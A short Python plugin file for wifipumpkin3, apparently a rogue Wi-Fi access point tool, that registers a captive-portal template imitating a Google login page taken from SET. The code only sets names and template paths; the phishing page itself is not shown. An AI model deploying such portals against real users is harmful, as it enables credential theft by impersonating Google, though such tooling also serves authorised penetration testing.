# file => darkgoogle.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class google(CaptiveTemplatePlugin):
    Name = "google"
    Version = "1.0"
    Description = "Google portal from SET"
    Author = "usg-ishimura"
    TemplatePath = C.TEMPLATES_FLASK + "templates/google"
    StaticPath = C.TEMPLATES_FLASK + "templates/google/static"
    Preview = C.TEMPLATES_FLASK + "templates/google/preview.png"
